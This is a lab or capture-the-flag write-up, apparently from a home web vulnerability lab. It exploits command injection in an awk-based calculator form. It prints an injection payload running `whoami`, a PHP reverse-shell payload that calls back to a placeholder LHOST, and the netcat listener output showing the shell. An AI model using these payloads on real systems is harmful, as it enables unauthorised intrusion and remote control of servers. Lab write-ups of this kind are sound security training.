# Challange

### Website Interface:

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/626a22d3-af41-4538-9ebc-564b6f540c1e)

- When entering values in the input boxes, a corresponding output is generated. 

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/17353841-fe1c-4caf-8e36-3529d6b1bc0d)

- Upon inspecting the source code, I discovered certain elements or information.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/3c492101-a74e-4a5d-85b0-4ba9d25a84f9)

- It appears that I can potentially use the output.
- By entering the "random" value or input, I encountered a specific response or behaviour.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/4631c4f9-cff0-4e6f-888a-6f4f66549c38)

```html
<div class="p-5 mb-4 bg-light rounded-3" style="background-color: none !important; padding: 0 !important">
		            <p class="text-center">Executed: awk 'BEGIN {print sqrt(((-123)^2) + ((-789)^2))}'<br>Result: 798.53
</p>
		        </div>
```
- After attempting various options, one of them eventually proved successful in achieving the desired outcome.
- After modifying the "cmd" and injecting the `whoami` command, the system responded with the output displaying the username that is www-data.

- cmd: `789)^2))}';whoami;#`

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/d5f2c033-f456-4b7c-a404-c1d047d61252)

```html
		<div class="p-5 mb-4 bg-light rounded-3" style="background-color: none !important; padding: 0 !important">
		            <p class="text-center">Executed: awk 'BEGIN {print sqrt(((-123)^2) + ((-789)^2))}';whoami;#)^2))}'<br>Result: 798.53
www-data
</p>
```
- After experimenting with different payloads, you successfully landed on a PHP reverse shell, allowing you to regain a shell connection to the system.
- cmd: `789)^2))}';php -r '$sock=fsockopen("<LHOST>",1234);exec("/bin/sh -i <&3 >&3 2>&3");';#`

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/298a2f8e-7b00-459b-823f-17606847ecbd)

```bash
└─$ rlwrap nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.251.186] from (UNKNOWN) [172.18.0.4] 50032
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```
